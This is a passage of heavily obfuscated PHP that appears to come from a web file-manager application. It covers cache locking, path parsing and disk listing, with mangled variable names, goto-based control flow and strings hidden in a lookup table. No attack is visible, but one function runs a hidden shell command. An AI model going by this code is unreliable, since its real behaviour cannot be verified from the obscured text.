$Å˜Öçë¾ =& $_SERVER[§Êá¸İ]; $¹ç×º = parent::listData(); $°¼—´À„ = !1; foreach ($¹ç×º as $åÍŞè¸ª) { if (!$åÍŞè¸ª || $åÍŞè¸ª[$Å˜Öçë¾[2000]] == $Å˜Öçë¾[228] || $åÍŞè¸ª[$Å˜Öçë¾[2185]] == 1) { continue; } if (strstr($åÍŞè¸ª[$Å˜Öçë¾[495]], $Å˜Öçë¾[2451])) { continue; } if (!strstr($åÍŞè¸ª[$Å˜Öçë¾[495]], $Å˜Öçë¾[2452])) { continue; } if (!$°¼—´À„) { $°¼—´À„ = $åÍŞè¸ª; continue; } $…Ï„ôşº = explode($Å˜Öçë¾[50], $°¼—´À„[$Å˜Öçë¾[495]]); $€¸ª¬¾ß = explode($Å˜Öçë¾[50], $åÍŞè¸ª[$Å˜Öçë¾[495]]); if (count($…Ï„ôşº) > count($€¸ª¬¾ß)) { $°¼—´À„ = $åÍŞè¸ª; } } return $°¼—´À„ ? $°¼—´À„[$Å˜Öçë¾[483]] : $Å˜Öçë¾[12]; } public function sort($ù†¹Í³ª, $èÊ¢ï©¢) { return parent::update($ù†¹Í³ª, $èÊ¢ï©¢); } } $_file = $_SERVER[$_SERVER[§Êá¸İ][473]]; goto cĞ ¼èï·; B¼‘±‹Á¦: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ì³†Óâ¼ =& $_SERVER[§Êá¸İ]; $ª±¯ø†ò = $GLOBALS[$Ì³†Óâ¼[6]][$Ì³†Óâ¼[425]]; self::$cachePath = $ª±¯ø†ò[$Ì³†Óâ¼[230]][$Ì³†Óâ¼[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ˆ«úœÔÌ, $ò®œê˜È = 0) { $¶ûÙø† =& $_SERVER[§Êá¸İ]; $„ºÄš–° = microtime(!0); $‡ô¤µá = $„ºÄš–° + $ò®œê˜È + 0.0001; $ ‰–ùãÏ = rtrim(self::$cachePath, $¶ûÙø†[8]) . $¶ûÙø†[950] . md5($ˆ«úœÔÌ) . $¶ûÙø†[947]; if (file_exists($ ‰–ùãÏ) && filemtime($ ‰–ùãÏ) && filemtime($ ‰–ùãÏ) < time() - 10) { @unlink($ ‰–ùãÏ); } do { if (file_exists($ ‰–ùãÏ)) { cacheLockWait(); continue; } $²èøèêı = fopen($ ‰–ùãÏ, $¶ûÙø†[951]); if (!$²èøèêı) { return !1; } $ÜØıõ¦® = flock($²èøèêı, LOCK_EX | LOCK_NB); self::$caches[$ˆ«úœÔÌ] = array($¶ûÙø†[952] => $²èøèêı, $¶ûÙø†[230] => $ ‰–ùãÏ); fwrite($²èøèêı, $‡ô¤µá); clearstatcache(); if ($²èøèêı && $ÜØıõ¦®) { return !0; } cacheLockWait(); } while (microtime(!0) < $‡ô¤µá); $this->unlock($ˆ«úœÔÌ); return !1; } public function lockGet($õèó€ŠÄ) { $ËˆÖòÓÉ =& $_SERVER[§Êá¸İ]; $¯Èµ¡Îá = rtrim(self::$cachePath, $ËˆÖòÓÉ[8]) . $ËˆÖòÓÉ[950] . md5($õèó€ŠÄ) . $ËˆÖòÓÉ[947]; return file_exists($¯Èµ¡Îá); } public function unlock($Ãà¸øŒØ) { $¨×ÅªÕ× =& $_SERVER[§Êá¸İ]; $†°°á½ = self::$caches[$Ãà¸øŒØ]; if (!$†°°á½) { return; } @flock($†°°á½[$¨×ÅªÕ×[952]], LOCK_UN); @fclose($†°°á½[$¨×ÅªÕ×[952]]); @unlink($†°°á½[$¨×ÅªÕ×[230]]); unset(self::$caches[$Ãà¸øŒØ]); } } class CacheLockRedis { public function lock($§øíèù, $ÕÒéÇ = 10) { $­ıÒï‰û = Cache::init(); $àª··ÎÖ = microtime(!0) + $ÕÒéÇ; while (microtime(!0) < $àª··ÎÖ) { $â“àüÀ = $­ıÒï‰û->get($§øíèù); if (!$â“àüÀ) { $“İĞõ™£ = $­ıÒï‰û->setLock($§øíèù, $àª··ÎÖ, $ÕÒéÇ); if ($“İĞõ™£) { return !0; } } else { if ($â“àüÀ < microtime(!0)) { $­ıÒï‰û->set($§øíèù, $àª··ÎÖ, $ÕÒéÇ * 2); if ($­ıÒï‰û->get($§øíèù) === $â“àüÀ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($À©¥´û•) { return Cache::init()->get($À©¥´û•); } public function unlock($æ–Åªû…) { return Cache::init()->remove($æ–Åªû…); } } class CacheLockMemcached { public function lock($¥éÑ¯ØÃ, $ÙÕëšÄ = 0) { $ŸÎâ”ø = Cache::init(); $÷ó›·‰É = microtime(!0) + $ÙÕëšÄ; while (microtime(!0) < $÷ó›·‰É) { $õ¿Òñ = $ŸÎâ”ø->get($¥éÑ¯ØÃ); if (!$õ¿Òñ || $õ¿Òñ < microtime(!0)) { $¯ÊÃø›ğ = $ŸÎâ”ø->handle->add($¥éÑ¯ØÃ, $÷ó›·‰É, $ÙÕëšÄ); if ($¯ÊÃø›ğ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($›ìÉ•†É) { return Cache::init()->get($›ìÉ•†É); } public function unlock($î£ì¨¢¸) { return Cache::init()->remove($î£ì¨¢¸); } } goto BºÁøÅ„õ¯; dµª‰§‚ºÓ: function binCheckBigger($Íî‚Æè, $òÖ ¸÷Ú) { return $Íî‚Æè > $òÖ ¸÷Ú; } $_SERVER[$_SERVER[µ–é µ][3]] = ("\x38\x35\x31\x35"."\x39\x36")+0;$_mfku="iypnh0fkrzadetx7c12q84j3go6ubm9s5wlvu2759kgtos16cyizvdahmelq3n04pxbwfjr8u8xc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($—¹‘––, $ğÏÂº‹á) { $‚‚×„İ =& $_SERVER[§Êá¸İ]; if (isset(self::$_methodList[$—¹‘––])) { return @call_user_func_array(self::$_methodList[$—¹‘––], $ğÏÂº‹á); } else { if (method_exists($this, $—¹‘––)) { return call_user_func_array(array($this, $—¹‘––), $ğÏÂº‹á); } else { think_exception(__CLASS__ . $‚‚×„İ[4] . $—¹‘–– . $‚‚×„İ[5]); } } } public static function __callStatic($ñœÙÂ­ß, $×ßúüÚˆ) { if (isset(self::$_methodListStatic[$ñœÙÂ­ß])) { return call_user_func_array(self::$_methodListStatic[$ñœÙÂ­ß], $×ßúüÚˆ); } else { if (method_exists(self, $ñœÙÂ­ß)) { return call_user_func_array(array(self, $ñœÙÂ­ß), $×ßúüÚˆ); } else { show_json("{$ñœÙÂ­ß}\x28\51\x20\156\x6f\164\40\145\170\151\x73\x74\73", !1); } } } public static function addMethod($½Æïëˆ, $×õÍÉ…Ô) { self::$_methodList[$½Æïëˆ] = $×õÍÉ…Ô; } public static function addMethodStatic($©‚×¹±Ú, $÷œº—¸) { self::$_methodListStatic[$©‚×¹±Ú] = $÷œº—¸; } } goto cÍÂÚîì“­; dùÎ³ğÏƒÊ: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\122\x65\143\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\x69\154\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\x72\x46\x69\x6c\x65\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\160\x52\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\162\123\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\123\150\x61\x72\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\145\x54\157\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\x65\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\x61\162\145\111\164\x65\x6d\x4c\x69\156\153\175"; const KOD_SEARCH = "\173\x73\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\173\x62\154\157\x63\x6b\x7d"; const KOD_IO = "\173\151\157\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\122\x65\x6e\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\151\166\x65\x72\175"; public static function typeList() { $‰˜âã¤ =& $_SERVER[§Êá¸İ]; return array($‰˜âã¤[1346] => self::KOD_SOURCE, $‰˜âã¤[1347] => self::KOD_USER_RECYCLE, $‰˜âã¤[1348] => self::KOD_USER_FAV, $‰˜âã¤[1349] => self::KOD_USER_FILE_TAG, $‰˜âã¤[1350] => self::KOD_USER_FILE_TYPE, $‰˜âã¤[1351] => self::KOD_GROUP_ROOT_SELF, $‰˜âã¤[1352] => self::KOD_USER_SHARE, $‰˜âã¤[1353] => self::KOD_USER_SHARE_LINK, $‰˜âã¤[1354] => self::KOD_USER_SHARE_TO_ME, $‰˜âã¤[1355] => self::KOD_SHARE_ITEM, $‰˜âã¤[1356] => self::KOD_SHARE_LINK, $‰˜âã¤[1357] => self::KOD_SEARCH, $‰˜âã¤[1358] => self::KOD_BLOCK, $‰˜âã¤[1359] => self::KOD_IO, $‰˜âã¤[1360] => self::KOD_USER_RECENT, $‰˜âã¤[1361] => self::KOD_USER_DRIVER); } public static function parse($ÕóÒŞîà) { $É¾€ŠÃµ =& $_SERVER[§Êá¸İ]; $ÕóÒŞîà = self::clear($ÕóÒŞîà); $Ö™   = array_values(self::typeList()); preg_match($É¾€ŠÃµ[1362], $ÕóÒŞîà, $Òà¿¤±); $¤”ø©‰İ = array($É¾€ŠÃµ[504] => !1, $É¾€ŠÃµ[1363] => !1, $É¾€ŠÃµ[501] => !1, $É¾€ŠÃµ[87] => $ÕóÒŞîà, $É¾€ŠÃµ[1261] => !1, $É¾€ŠÃµ[1260] => $É¾€ŠÃµ[12]); if (is_array($Òà¿¤±) && count($Òà¿¤±) == 5) { $Ãœ‘¥å = $É¾€ŠÃµ[1364] . $Òà¿¤±[2] . $É¾€ŠÃµ[403]; if (in_array($Ãœ‘¥å, $Ö™  )) { $¤”ø©‰İ[$É¾€ŠÃµ[1261]] = $Òà¿¤±[1]; $¤”ø©‰İ[$É¾€ŠÃµ[33]] = $Ãœ‘¥å; $¤”ø©‰İ[$É¾€ŠÃµ[1365]] = substr($Ãœ‘¥å, 1, -1); $¤”ø©‰İ[$É¾€ŠÃµ[483]] = $Òà¿¤±[3]; } $¤”ø©‰İ[$É¾€ŠÃµ[1260]] = $Òà¿¤±[4]; } $¦í§Ûš = array($É¾€ŠÃµ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¤”ø©‰İ[$É¾€ŠÃµ[1328]] = in_array($¤”ø©‰İ[$É¾€ŠÃµ[33]], $¦í§Ûš); return $¤”ø©‰İ; } public static function isTruePath($ÁÑ®Èô) { $Æ®ÎûÏÖ =& $_SERVER[§Êá¸İ]; if (substr($ÁÑ®Èô, 0, 1) != $Æ®ÎûÏÖ[1364]) { return !0; } if (strpos($ÁÑ®Èô, $Æ®ÎûÏÖ[491]) === 0) { return !0; } if (strpos($ÁÑ®Èô, $Æ®ÎûÏÖ[1332]) === 0) { return !0; } if (strpos($ÁÑ®Èô, $Æ®ÎûÏÖ[1366]) === 0) { return !0; } if (strpos($ÁÑ®Èô, $Æ®ÎûÏÖ[1367]) === 0) { return !0; } if (strpos($ÁÑ®Èô, $Æ®ÎûÏÖ[1368]) === 0) { return !0; } return !1; } public static function clear($şª¿Èì¡) { $Ï”’˜ÅÆ =& $_SERVER[§Êá¸İ]; $şª¿Èì¡ = str_replace(array($Ï”’˜ÅÆ[1167], $Ï”’˜ÅÆ[262]), $Ï”’˜ÅÆ[53], $şª¿Èì¡); $şª¿Èì¡ = str_replace($Ï”’˜ÅÆ[100], $Ï”’˜ÅÆ[8], $şª¿Èì¡); $úº®šÆ¼ = $Ï”’˜ÅÆ[1369]; if (substr($şª¿Èì¡, 0, 3) == $Ï”’˜ÅÆ[1370]) { $şª¿Èì¡ = substr($şª¿Èì¡, 3); } while (strstr($şª¿Èì¡, $úº®šÆ¼)) { $şª¿Èì¡ = str_replace($úº®šÆ¼, $Ï”’˜ÅÆ[8], $şª¿Èì¡); } $şª¿Èì¡ = preg_replace($Ï”’˜ÅÆ[1371], $Ï”’˜ÅÆ[8], $şª¿Èì¡); if ($şª¿Èì¡ == $Ï”’˜ÅÆ[8]) { return $Ï”’˜ÅÆ[8]; } $şª¿Èì¡ = rtrim($şª¿Èì¡, $Ï”’˜ÅÆ[8]); return $şª¿Èì¡; } public static function pathTrue($òºÚ¸÷») { $ƒŸÎŒ†é =& $_SERVER[§Êá¸İ]; if (!$òºÚ¸÷») { return $ƒŸÎŒ†é[12]; } $òºÚ¸÷» = str_replace($ƒŸÎŒ†é[600], $ƒŸÎŒ†é[8], str_replace($ƒŸÎŒ†é[1372], $ƒŸÎŒ†é[8], $òºÚ¸÷»)); $òºÚ¸÷» = str_replace($ƒŸÎŒ†é[600], $ƒŸÎŒ†é[8], str_replace($ƒŸÎŒ†é[1372], $ƒŸÎŒ†é[8], $òºÚ¸÷»)); if (!strstr($òºÚ¸÷», $ƒŸÎŒ†é[1370])) { return $òºÚ¸÷»; } $€™´†î = explode($ƒŸÎŒ†é[8], $òºÚ¸÷»); foreach ($€™´†î as $­å·õû => $ŞÈ·‹ÔÒ) { if ($ŞÈ·‹ÔÒ !== $ƒŸÎŒ†é[1373]) { continue; } for ($İëÌëàÑ = $­å·õû; $İëÌëàÑ >= 0; $İëÌëàÑ--) { if ($€™´†î[$İëÌëàÑ] === $ƒŸÎŒ†é[10] || $€™´†î[$İëÌëàÑ] === $ƒŸÎŒ†é[1373] || $€™´†î[$İëÌëàÑ] === -1) { continue; } if ($€™´†î[$İëÌëàÑ] === $ƒŸÎŒ†é[12]) { $€™´†î[$­å·õû] = -1; break; } $€™´†î[$­å·õû] = -1; $€™´†î[$İëÌëàÑ] = -1; break; } } $²‹¹”ûÄ = array(); foreach ($€™´†î as $ŞÈ·‹ÔÒ) { if ($ŞÈ·‹ÔÒ !== -1) { $²‹¹”ûÄ[] = $ŞÈ·‹ÔÒ; } } $ªŠ ÍŸ = implode($ƒŸÎŒ†é[8], $²‹¹”ûÄ); if (strpos($ªŠ ÍŸ, $ƒŸÎŒ†é[1374]) === 0) { $ªŠ ÍŸ = $ƒŸÎŒ†é[1370] . substr($ªŠ ÍŸ, strlen($ƒŸÎŒ†é[1374])); } return $ªŠ ÍŸ; } public static function pathUrlClear($‰ì¸Ùº) { $Ú²…êµê =& $_SERVER[§Êá¸İ]; if (!$‰ì¸Ùº) { return $‰ì¸Ùº; } $‰ì¸Ùº = rawurldecode($‰ì¸Ùº); $‰ì¸Ùº = str_replace($Ú²…êµê[1372], $Ú²…êµê[8], $‰ì¸Ùº); if (strpos($‰ì¸Ùº, $Ú²…êµê[76]) > 0) { $‰ì¸Ùº = substr($‰ì¸Ùº, 0, strpos($‰ì¸Ùº, $Ú²…êµê[76])); } if (strpos($‰ì¸Ùº, $Ú²…êµê[1375]) > 0) { $‰ì¸Ùº = substr($‰ì¸Ùº, 0, strpos($‰ì¸Ùº, $Ú²…êµê[1375])); } return $‰ì¸Ùº; } public static function sourceID($¨ÁûÜ¨±) { $×í¥°£Á =& $_SERVER[§Êá¸İ]; $ËÛ×ÈÄê = self::parse($¨ÁûÜ¨±); if ($ËÛ×ÈÄê[$×í¥°£Á[33]] !== self::KOD_SOURCE) { show_json(LNG($×í¥°£Á[1376]), !1); } return $ËÛ×ÈÄê[$×í¥°£Á[483]]; } public static function make($…ŞñêŞŞ) { if (!$…ŞñêŞŞ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($…ŞñêŞŞ)); } public static function makeShare($›ûï¬àå, $‰ò„ù™) { return self::makePath(self::KOD_SHARE_ITEM, $›ûï¬àå, $‰ò„ù™); } public static function makeFileTypePath($±¿£ÒÂ) { return self::makePath(self::KOD_USER_FILE_TYPE, $±¿£ÒÂ); } public static function makeFileTagPath($ğáşğÓÅ) { return self::makePath(self::KOD_USER_FILE_TAG, $ğáşğÓÅ); } public static function makePath($‘­Š¢«Ã, $êÄ£‹­ø = '', $´µ…ƒ×¡ = '') { $éÕƒ¢øŞ =& $_SERVER[§Êá¸İ]; $•Òò€¶ó = substr($‘­Š¢«Ã, 1, -1); $¢œıòÈ· = $éÕƒ¢øŞ[1377] . $•Òò€¶ó . $éÕƒ¢øŞ[1378] . $êÄ£‹­ø . $éÕƒ¢øŞ[1379]; $¢œıòÈ· = $´µ…ƒ×¡ ? $¢œıòÈ· . $´µ…ƒ×¡ . $éÕƒ¢øŞ[8] : $¢œıòÈ·; return $¢œıòÈ·; } public static function hashPath($¡Àå˜Ù, $¦Û½åàÓ = true) { $†¡ô„Œ =& $_SERVER[§Êá¸İ]; $•˜ ÒØÏ = is_array($¡Àå˜Ù) ? $¡Àå˜Ù : IO::info($¡Àå˜Ù); $”Ó‚ÔøÖ = _get($•˜ ÒØÏ, $†¡ô„Œ[1380], $†¡ô„Œ[12]); if (!$”Ó‚ÔøÖ && isset($•˜ ÒØÏ[$†¡ô„Œ[235]])) { $”Ó‚ÔøÖ = trim($•˜ ÒØÏ[$†¡ô„Œ[235]], $†¡ô„Œ[121]); } if (!$”Ó‚ÔøÖ && isset($•˜ ÒØÏ[$†¡ô„Œ[193]]) && $•˜ ÒØÏ[$†¡ô„Œ[193]]) { $•˜ ÒØÏ = IO::info(KodIO::make($•˜ ÒØÏ[$†¡ô„Œ[193]])); $”Ó‚ÔøÖ = _get($•˜ ÒØÏ, $†¡ô„Œ[1380], $†¡ô„Œ[12]); } $‰§½œÄŠ = md5($•˜ ÒØÏ[$†¡ô„Œ[87]] . $•˜ ÒØÏ[$†¡ô„Œ[79]] . $•˜ ÒØÏ[$†¡ô„Œ[88]]); if (!$”Ó‚ÔøÖ && file_exists($•˜ ÒØÏ[$†¡ô„Œ[87]])) { $”Ó‚ÔøÖ = Cache::get($‰§½œÄŠ . $†¡ô„Œ[1381]); $”Ó‚ÔøÖ = !1; if (!$”Ó‚ÔøÖ) { $”Ó‚ÔøÖ = IO::hashSimple($•˜ ÒØÏ[$†¡ô„Œ[87]]); Cache::set($‰§½œÄŠ . $†¡ô„Œ[1381], $”Ó‚ÔøÖ, 3600 * 24 * 30); } } if ($¦Û½åàÓ && !$”Ó‚ÔøÖ) { } return $”Ó‚ÔøÖ ? $”Ó‚ÔøÖ : $‰§½œÄŠ; } public static function hashPathSafe($ç•–ìÃ, $áÊ¢¥×– = true) { $‡ŠäÅƒò =& $_SERVER[§Êá¸İ]; $á¯ë–•š = self::hashPath($ç•–ìÃ, $áÊ¢¥×–); return md5($á¯ë–•š . $‡ŠäÅƒò[1382] . Model($‡ŠäÅƒò[857])->get($‡ŠäÅƒò[858])); } public static function initSystemPath() { $áÉ³¬ =& $_SERVER[§Êá¸İ]; if (defined($áÉ³¬[1383])) { return; } define($áÉ³¬[1383], self::systemPath($áÉ³¬[191])); define($áÉ³¬[1384], self::systemPath($áÉ³¬[1385])); define($áÉ³¬[1386], self::systemPath($áÉ³¬[1387])); define($áÉ³¬[1388], self::systemPath($áÉ³¬[1389])); IOHistory::bindEvent(); } public static function systemPath($Ã§´Ê«å) { $ãÀ¤¢ÇÜ =& $_SERVER[§Êá¸İ]; $¦¬ä„–˜ = $ãÀ¤¢ÇÜ[1390] . ucfirst($Ã§´Ê«å); $Ÿ¢ÕâŞ• = Model($ãÀ¤¢ÇÜ[857])->get($¦¬ä„–˜); if ($Ÿ¢ÕâŞ•) { return $Ÿ¢ÕâŞ•; } if ($Ã§´Ê«å == $ãÀ¤¢ÇÜ[191]) { $Ÿ¢ÕâŞ• = self::make(Model($ãÀ¤¢ÇÜ[911])->systemRootPathAdd($ãÀ¤¢ÇÜ[613])); } else { $Ÿ¢ÕâŞ• = self::systemPath($ãÀ¤¢ÇÜ[191]); $ò¾ñ³ ë = self::sourceID($Ÿ¢ÕâŞ•); $Ÿ¢ÕâŞ• = self::make(Model($ãÀ¤¢ÇÜ[911])->mkdir($ò¾ñ³ ë, $Ã§´Ê«å)); } Model($ãÀ¤¢ÇÜ[857])->set($¦¬ä„–˜, $Ÿ¢ÕâŞ•); return $Ÿ¢ÕâŞ•; } public static function systemFolder($ÒÁë¢ÒÈ) { $ä¹²ö°ô = IO_PATH_SYSTEM_SOURCE . $ÒÁë¢ÒÈ; $˜‚‰™†õ = Cache::get($ä¹²ö°ô); if (!$˜‚‰™†õ) { $¨°ÎñëØ = IO::infoFullSimple($ä¹²ö°ô); if (!$¨°ÎñëØ) { $˜‚‰™†õ = IO::mkdir($ä¹²ö°ô, REPEAT_SKIP); } else { $˜‚‰™†õ = $¨°ÎñëØ[$_SERVER[§Êá¸İ][87]]; } Cache::set($ä¹²ö°ô, $˜‚‰™†õ, 3600 * 10); } return $˜‚‰™†õ; } public static function defaultDriver() { return Model($_SERVER[§Êá¸İ][854])->defaultDriver(); } public static function defaultIO() { $’©‚Ú¡à =& $_SERVER[§Êá¸İ]; $óÓ—‡ƒæ = self::defaultDriver(); return $’©‚Ú¡à[1391] . $óÓ—‡ƒæ[$’©‚Ú¡à[483]] . $’©‚Ú¡à[1379]; } public static function defaultDriverInit() { static $ëµàéª½ = false; if ($ëµàéª½) { return $ëµàéª½; } $ëµàéª½ = IO::init(self::defaultIO()); return $ëµàéª½; } public static function fileTypeList() { $¿ÓÎµø” =& $_SERVER[§Êá¸İ]; $ˆ£ÃåÏü = $GLOBALS[$¿ÓÎµø”[6]][$¿ÓÎµø”[1392]]; foreach ($ˆ£ÃåÏü as $£ÁÊµ°± => $©ì¶î¸ä) { $»ª•Ñä… = $¿ÓÎµø”[1393] . $£ÁÊµ°±; $ƒ»†åÆÂ = LNG($»ª•Ñä…); if ($»ª•Ñä… != $ƒ»†åÆÂ) { $ˆ£ÃåÏü[$£ÁÊµ°±][$¿ÓÎµø”[32]] = $ƒ»†åÆÂ; } } return $ˆ£ÃåÏü; } public static function diskList($–Š¡Óß® = true) { $’ç¸´­ö = $_SERVER[§Êá¸İ][1394]; if ($–Š¡Óß®) { $²÷ÆÜÌƒ = Cache::get($’ç¸´­ö); if (is_array($²÷ÆÜÌƒ)) { return $²÷ÆÜÌƒ; } } $²÷ÆÜÌƒ = self::diskListGet(); Cache::set($’ç¸´­ö, $²÷ÆÜÌƒ, 60); return $²÷ÆÜÌƒ; } public static function diskListGet() { $Ëˆ¿—Á„ =& $_SERVER[§Êá¸İ]; $Éé…­û„ = array(); if ($GLOBALS[$Ëˆ¿—Á„[6]][$Ëˆ¿—Á„[1395]] == $Ëˆ¿—Á„[1396]) { $ÉŠéºëÄ = $Ëˆ¿—Á„[1397]; for ($¾«ÄËí’ = 0; $¾«ÄËí’ < strlen($ÉŠéºëÄ); $¾«ÄËí’++) { $´’Œ±¤¾ = $ÉŠéºëÄ[$¾«ÄËí’] . $Ëˆ¿—Á„[1398]; if (file_exists($´’Œ±¤¾)) { $Éé…­û„[] = $´’Œ±¤¾; } } return $Éé…­û„; } if (!function_exists($Ëˆ¿—Á„[101])) { $Éé…­û„[] = $Ëˆ¿—Á„[922]; return $Éé…­û„; } $İ„‡Û÷— = explode($Ëˆ¿—Á„[262], shell_exec($Ëˆ¿—Á„[1399])); array_shift($İ„‡Û÷—); array_pop($İ„‡Û÷—); $ÂÚ¶Ÿ©è = array($Ëˆ¿—Á„[1400], $Ëˆ¿—Á„[1401], $Ëˆ¿—Á„[1402], $Ëˆ¿—Á„[1403], $Ëˆ¿—Á„[1404], $Ëˆ¿—Á„[1405], $Ëˆ¿—Á„[1406], $Ëˆ¿—Á„[1407]); foreach ($İ„‡Û÷— as $€´¼Î) { $Ûä¦Ôñ = preg_split($Ëˆ¿—Á„[1408], $€´¼Î); $´’Œ±¤¾ = $Ûä¦Ôñ[count($Ûä¦Ôñ) - 1]; if (!strstr($Ûä¦Ôñ[0], $Ëˆ¿—Á„[1409]) || !$´’Œ±¤¾) { continue; } $ıìÃ¡“õ = rtrim($´’Œ±¤¾, $Ëˆ¿—Á„[8]) . $Ëˆ¿—Á„[8]; if (in_array($ıìÃ¡“õ, $ÂÚ¶Ÿ©è)) { continue; } $Éé…­û„[] = $ıìÃ¡“õ; } return $Éé…­û„; } public static function isSameDisk($±Ú©Æ£á, $æªÚğï) { $Èô£¥“» =& $_SERVER[§Êá¸İ]; if ($GLOBALS[$Èô£¥“»[6]][$Èô£¥“»[1395]] == $Èô£¥“»[1396]) { return strtolower(substr($±Ú©Æ£á, 0, 1)) == strtolower(substr($æªÚğï, 0, 1)); } $½ÏÓêÅ¼ = self::diskList(); $Í’ÂÁ™À = !1; $Ÿ§¢¦á„ = !1; sort($½ÏÓêÅ¼); $½ÏÓêÅ¼ = array_reverse($½ÏÓêÅ¼); $±Ú©Æ£á = rtrim($±Ú©Æ£á, $Èô£¥“»[8]) . $Èô£¥“»[8]; $æªÚğï = rtrim($æªÚğï, $Èô£¥“»[8]) . $Èô£¥“»[8]; foreach ($½ÏÓêÅ¼ as $ñä¬ßËÓ) { $‹¤Ü¥‹£ = strlen($ñä¬ßËÓ); if (!$Í’ÂÁ™À && substr($±Ú©Æ£á, 0, $‹¤Ü¥‹£) == $ñä¬ßËÓ) { $Í’ÂÁ™À = $ñä¬ßËÓ; } if (!$Ÿ§¢¦á„ && substr($æªÚğï, 0, $‹¤Ü¥‹£) == $ñä¬ßËÓ) { $Ÿ§¢¦á„ = $ñä¬ßËÓ; } if ($Í’ÂÁ™À && $Ÿ§¢¦á„) { break; } } return $Í’ÂÁ™À === $Ÿ§¢¦á„; } public static function transferType($¤¸óÕŞ, $ÆõÎùïñ) { $ÚÍ–¸«‹ =& $_SERVER[§Êá¸İ]; $ÎÛƒ†Æ = self::driverType($¤¸óÕŞ); $Ş¶²¥Š§ = self::driverType($ÆõÎùïñ); if ($ÎÛƒ†Æ[$ÚÍ–¸«‹[33]] == $Ş¶²¥Š§[$ÚÍ–¸«‹[33]] && $ÎÛƒ†Æ[$ÚÍ–¸«‹[1410]] == $Ş¶²¥Š§[$ÚÍ–¸«‹[1410]]) { return $ÚÍ–¸«‹[1411]; } if ($ÎÛƒ†Æ[$ÚÍ–¸«‹[33]] == $ÚÍ–¸«‹[955] && $Ş¶²¥Š§[$ÚÍ–¸«‹[33]] == $ÚÍ–¸«‹[109]) { return $ÚÍ–¸«‹[1289]; } if ($ÎÛƒ†Æ[$ÚÍ–¸«‹[33]] == $ÚÍ–¸«‹[109] && $Ş¶²¥Š§[$ÚÍ–¸«‹[33]] == $ÚÍ–¸«‹[955]) { return $ÚÍ–¸«‹[110]; } return $ÚÍ–¸«‹[1412]; } public static function driverType($Ì¢ÇÙØ§) { $ÙàÓµøİ =& $_SERVER[§Êá¸İ]; $îÜêè = str_replace($ÙàÓµøİ[1413], $ÙàÓµøİ[12], strtolower($Ì¢ÇÙØ§->getType())); if ($îÜêè == $ÙàÓµøİ[844] || $îÜêè == $ÙàÓµøİ[1414] || $îÜêè == $ÙàÓµøİ[1415]) { $Ì¢ÇÙØ§ = self::defaultDriverInit(); } else { if ($îÜêè == $ÙàÓµøİ[1299] || $îÜêè == $ÙàÓµøİ[1416]) { $Ì¢ÇÙØ§ = IO::init($Ì¢ÇÙØ§->pathParse[$ÙàÓµøİ[1242]]); } } $™¤Ó‰ğ½ = $Ì¢ÇÙØ§->path; $îÜêè = str_replace($ÙàÓµøİ[1413], $ÙàÓµøİ[12], strtolower($Ì¢ÇÙØ§->getType())); if ($îÜêè == $ÙàÓµøİ[109]) { return array($ÙàÓµøİ[33] => $ÙàÓµøİ[109], $ÙàÓµøİ[1410] => $ÙàÓµøİ[12], $ÙàÓµøİ[87] => $™¤Ó‰ğ½, $ÙàÓµøİ[98] => $Ì¢ÇÙØ§); } return array($ÙàÓµøİ[33] => $ÙàÓµøİ[955], $ÙàÓµøİ[1410] => $Ì¢ÇÙØ§->pathDriver, $ÙàÓµøİ[87] => $™¤Ó‰ğ½, $ÙàÓµøİ[98] => $Ì¢ÇÙØ§); } public static function pathDriverType($—ÂÇ¥Œ¥) { return $—ÂÇ¥Œ¥ ? self::driverType(IO::init($—ÂÇ¥Œ¥)) : !1; } public static function pathDriverLocal($ú˜ìöºº) { $ûı¢¹‰ù =& $_SERVER[§Êá¸İ]; $¡“Ñ¾Ü = $ú˜ìöºº ? self::driverType(IO::init($ú˜ìöºº)) : !1; return strtolower($¡“Ñ¾Ü[$ûı¢¹‰ù[33]]) == $ûı¢¹‰ù[109] ? !0 : !1; } public static function allowCover($·¸Âˆ»´, $¸àÛ’ˆ´ = true) { $ïäÄÉÔœ =& $_SERVER[§Êá¸İ]; if (is_string($·¸Âˆ»´)) { $·¸Âˆ»´ = IO::info($·¸Âˆ»´); } if (!$·¸Âˆ»´ || $·¸Âˆ»´[$ïäÄÉÔœ[33]] == $ïäÄÉÔœ[78] || $·¸Âˆ»´[$ïäÄÉÔœ[79]] <= 100) { return !1; } if (isset($·¸Âˆ»´[$ïäÄÉÔœ[1417]]) || !$·¸Âˆ»´[$ïäÄÉÔœ[87]]) { return !1; } if (isset($·¸Âˆ»´[$ïäÄÉÔœ[232]]) && !$·¸Âˆ»´[$ïäÄÉÔœ[232]]) { return !1; } static $ÒÍ‰·Ë = false; if (!$ÒÍ‰·Ë || !$¸àÛ’ˆ´) { $é×ÓˆÇß = self::driverType(IO::init($·¸Âˆ»´[$ïäÄÉÔœ[87]])); $œ»“¯‘– = $é×ÓˆÇß[$ïäÄÉÔœ[98]]; $ÒÍ‰·Ë = $ïäÄÉÔœ[196]; if 